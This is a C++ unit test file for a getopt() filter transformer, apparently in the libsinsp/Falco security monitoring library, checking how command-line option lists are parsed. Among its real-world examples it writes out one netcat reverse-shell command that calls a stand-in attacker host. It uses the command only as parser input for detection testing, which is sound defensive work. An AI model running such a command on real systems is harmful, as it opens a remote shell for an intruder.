	EXPECT_THROW(eval_filter(evt, R"(getopt(("a"), "n", "extra") intersects ("n"))"),
	             sinsp_exception);

	// getopt() first argument must be a list
	EXPECT_THROW(eval_filter(evt, R"(getopt("not_a_list", "n") intersects ("n"))"),
	             sinsp_exception);

	// getopt() second argument must not be a list
	EXPECT_THROW(eval_filter(evt, R"(getopt(("-n"), ("n")) intersects ("n"))"), sinsp_exception);

	// ========== Edge Cases ==========

	// Empty optstring - no options should be recognized
	EXPECT_FALSE(eval_filter(evt, R"(getopt(("-n", "-t"), "") intersects ("n"))"));
	EXPECT_FALSE(eval_filter(evt, R"(getopt(("-n", "-t"), "") intersects ("t"))"));

	// Empty argument list - should return empty result
	EXPECT_FALSE(eval_filter(evt, R"(getopt((""), "n") intersects ("n"))"));

	// All arguments are non-options - should return empty result
	EXPECT_FALSE(eval_filter(evt, R"(getopt(("arg1", "arg2", "arg3"), "n") intersects ("n"))"));

	// Single dash "-" is not an option (should be skipped)
	EXPECT_TRUE(eval_filter(evt, R"(getopt(("-", "-n"), "n") intersects ("n"))"));
	EXPECT_FALSE(eval_filter(evt, R"(getopt(("-"), "n") intersects ("n"))"));

	// Option requiring argument but none provided (uses empty string)
	EXPECT_TRUE(eval_filter(evt, R"(getopt(("-t"), "t:") intersects ("t"))"));
	EXPECT_TRUE(eval_filter(evt, R"(getopt(("-t"), "t:") intersects (""))"));

	// Multiple dashes in a row
	EXPECT_TRUE(eval_filter(evt, R"(getopt(("-n", "--", "--"), "n") intersects ("n"))"));
	EXPECT_FALSE(eval_filter(evt, R"(getopt(("--", "-n"), "n") intersects ("n"))"));

	// Non-alphanumeric characters in option position (should be skipped)
	EXPECT_TRUE(eval_filter(evt, R"(getopt(("-n-t"), "nt") intersects ("n", "t"))"));

	// ========== Chaining Edge Cases ==========

	// Chain with argument-taking option in the middle: -nat hello
	// Should parse as: n (no arg), a (takes "t hello" - wait, no)
	// Actually: n (no arg), a (takes "t" as immediate arg from same token)
	EXPECT_TRUE(
	        eval_filter(evt, R"(getopt(("-nat", "hello"), "na:t") intersects ("n", "a", "t"))"));

	// Chain with multiple no-arg options followed by arg-taking option with immediate value
	EXPECT_TRUE(
	        eval_filter(evt,
	                    R"(getopt(("-abcvalue"), "abc:") intersects ("a", "b", "c", "value"))"));

	// Chain where last option takes argument from next token
	EXPECT_TRUE(eval_filter(
	        evt,
	        R"(getopt(("-abc", "value"), "abc:") intersects ("a", "b", "c", "value"))"));

	// Same option appearing multiple times
	EXPECT_TRUE(eval_filter(evt, R"(getopt(("-n", "-n", "-n"), "n") intersects ("n"))"));
	EXPECT_TRUE(eval_filter(evt, R"(getopt(("-v", "-v", "-v"), "v") intersects ("v"))"));

	// Option with argument appearing multiple times
	EXPECT_TRUE(eval_filter(
	        evt,
	        R"(getopt(("-t", "val1", "-t", "val2"), "t:") intersects ("t", "val1", "val2"))"));

	// ========== Numeric and Special Arguments ==========

	// Options with numeric arguments
	EXPECT_TRUE(eval_filter(evt, R"(getopt(("-p", "8080"), "p:") intersects ("p", "8080"))"));
	EXPECT_TRUE(eval_filter(evt, R"(getopt(("-p8080"), "p:") intersects ("p", "8080"))"));
	EXPECT_TRUE(eval_filter(evt, R"(getopt(("-n", "42"), "n:") intersects ("n", "42"))"));

	// Options with negative numbers as arguments
	EXPECT_TRUE(eval_filter(evt, R"(getopt(("-t", "-123"), "t:") intersects ("t", "-123"))"));

	// Options with paths as arguments
	EXPECT_TRUE(
	        eval_filter(evt,
	                    R"(getopt(("-f", "/etc/passwd"), "f:") intersects ("f", "/etc/passwd"))"));
	EXPECT_TRUE(eval_filter(
	        evt,
	        R"(getopt(("-f", "./relative/path"), "f:") intersects ("f", "./relative/path"))"));

	// Options with URLs as arguments
	EXPECT_TRUE(eval_filter(
	        evt,
	        R"(getopt(("-u", "http://example.com:8080/path"), "u:") intersects ("u", "http://example.com:8080/path"))"));

	// Options with empty string as explicit argument
	EXPECT_TRUE(eval_filter(evt, R"(getopt(("-t", ""), "t:") intersects ("t", ""))"));

	// ========== Real-World Command Examples ==========

	// SSH-like: ssh -p 22 -i keyfile user@host
	EXPECT_TRUE(eval_filter(
	        evt,
	        R"(getopt(("-p", "22", "-i", "keyfile", "user@host"), "p:i:") intersects ("p", "22", "i", "keyfile"))"));

	// Tar-like: tar -xzf file.tar.gz
	EXPECT_TRUE(eval_filter(
	        evt,
	        R"(getopt(("-xzf", "file.tar.gz"), "xzf:") intersects ("x", "z", "f", "file.tar.gz"))"));

	// Curl-like: curl -X POST -H "header" -d "data" url
	EXPECT_TRUE(eval_filter(
	        evt,
	        R"(getopt(("-X", "POST", "-H", "header", "-d", "data", "url"), "X:H:d:") intersects ("X", "POST", "H", "header", "d", "data"))"));

	// Netcat reverse shell: nc -e /bin/sh attacker.com 4444
	EXPECT_TRUE(eval_filter(
	        evt,
	        R"(getopt(("-e", "/bin/sh", "attacker.com", "4444"), "e:") intersects ("e", "/bin/sh"))"));

	// Grep-like: grep -rn "pattern" /path
	EXPECT_TRUE(
	        eval_filter(evt, R"(getopt(("-rn", "pattern", "/path"), "rn") intersects ("r", "n"))"));

	// Docker-like: docker run -it -p 8080:80 -v /host:/container image
	EXPECT_TRUE(eval_filter(
	        evt,
	        R"(getopt(("-it", "-p", "8080:80", "-v", "/host:/container", "image"), "itp:v:") intersects ("i", "t", "p", "8080:80", "v", "/host:/container"))"));

	// Find with exec: find . -name "*.txt" -exec rm {} \;
	EXPECT_TRUE(eval_filter(
	        evt,
	        R"(getopt(("-name", "*.txt", "-exec", "rm", "{}", ";"), "n:e:") intersects ("n", "*.txt", "e", "rm"))"));

	// ========== Complex Optstring Patterns ==========

	// All options take arguments
	EXPECT_TRUE(eval_filter(
	        evt,
	        R"(getopt(("-a", "1", "-b", "2", "-c", "3"), "a:b:c:") intersects ("a", "1", "b", "2", "c", "3"))"));

	// No options take arguments
	EXPECT_TRUE(eval_filter(evt, R"(getopt(("-abc"), "abc") intersects ("a", "b", "c"))"));

	// Alternating: option, arg, option, no-arg
	EXPECT_TRUE(
	        eval_filter(evt, R"(getopt(("-a", "val", "-b"), "a:b") intersects ("a", "val", "b"))"));

	// Long chain with mix
	EXPECT_TRUE(eval_filter(
	        evt,
	        R"(getopt(("-abcdefg"), "abcdefg") intersects ("a", "b", "c", "d", "e", "f", "g"))"));

	// Numeric option names
	EXPECT_TRUE(
	        eval_filter(evt, R"(getopt(("-1", "-2", "-3"), "123") intersects ("1", "2", "3"))"));

	// Mixed alphanumeric options
	EXPECT_TRUE(eval_filter(
	        evt,
	        R"(getopt(("-a1b2c3"), "a1b2c3") intersects ("a", "1", "b", "2", "c", "3"))"));

	// ========== Option After Non-Option (GNU Extension) ==========

	// Options scattered among non-options
	EXPECT_TRUE(eval_filter(
	        evt,
	        R"(getopt(("file1", "-n", "file2", "-t", "val", "file3"), "nt:") intersects ("n", "t", "val"))"));

	// Non-options at start, middle, and end
	EXPECT_TRUE(eval_filter(
	        evt,
	        R"(getopt(("arg1", "arg2", "-a", "arg3", "-b", "arg4", "arg5"), "ab") intersects ("a", "b"))"));

	// Option takes non-option as argument
	EXPECT_TRUE(eval_filter(
	        evt,
	        R"(getopt(("regular_file", "-f", "another_file"), "f:") intersects ("f", "another_file"))"));

	// ========== Empty Values and Whitespace ==========

	// Option with whitespace-only argument (if supported by the test framework)
	EXPECT_TRUE(eval_filter(evt, R"(getopt(("-t", " "), "t:") intersects ("t", " "))"));

	// Multiple empty strings in argument list
	EXPECT_TRUE(eval_filter(evt, R"(getopt(("", "-n", ""), "n") intersects ("n"))"));

	// ========== Stress Tests ==========

	// Very long option chain
	EXPECT_TRUE(eval_filter(
	        evt,
	        R"(getopt(("-abcdefghijklmnopqrstuvwxyz"), "abcdefghijklmnopqrstuvwxyz") intersects ("a", "b", "c", "z"))"));

	// Many separate options
	EXPECT_TRUE(eval_filter(
	        evt,
	        R"(getopt(("-a", "-b", "-c", "-d", "-e", "-f"), "abcdef") intersects ("a", "b", "c", "d", "e", "f"))"));

	// Option with very long argument value
	EXPECT_TRUE(eval_filter(
	        evt,
	        R"(getopt(("-t", "this_is_a_very_long_argument_value_that_might_test_buffer_handling"), "t:") intersects ("t", "this_is_a_very_long_argument_value_that_might_test_buffer_handling"))"));
}

TEST(multivalue_transformer_getopt, argument_types) {
	// Create arguments for getopt: args list and optstring
	std::vector<std::unique_ptr<sinsp_filter_check>> args;

	// First argument: a list of strings
	std::vector<std::string> list_values = {"-n", "-t", "value"};
	args.push_back(std::make_unique<list_check>(list_values));

	// Second argument: optstring
	args.push_back(std::make_unique<rawstring_check>("nt:"));

	// Create the getopt transformer
	sinsp_filter_multivalue_transformer_getopt getopt_transformer(std::move(args));

	// Test argument_types()
	const auto& arg_types = getopt_transformer.argument_types();

	ASSERT_EQ(arg_types.size(), 2);

	// First argument should be PT_CHARBUF and a list
	EXPECT_EQ(arg_types[0].type, PT_CHARBUF);
	EXPECT_TRUE(arg_types[0].is_list);

	// Second argument should be PT_CHARBUF and not a list
	EXPECT_EQ(arg_types[1].type, PT_CHARBUF);
	EXPECT_FALSE(arg_types[1].is_list);
}

TEST(multivalue_transformer_getopt, result_type) {
	std::vector<std::unique_ptr<sinsp_filter_check>> args;
	std::vector<std::string> list_values = {"-n", "-t", "value"};
	args.push_back(std::make_unique<list_check>(list_values));
	args.push_back(std::make_unique<rawstring_check>("nt:"));

	sinsp_filter_multivalue_transformer_getopt getopt_transformer(std::move(args));

	// getopt should return PT_CHARBUF as a list
	auto result = getopt_transformer.result_type();
	EXPECT_EQ(result.type, PT_CHARBUF);
	EXPECT_TRUE(result.is_list);
}
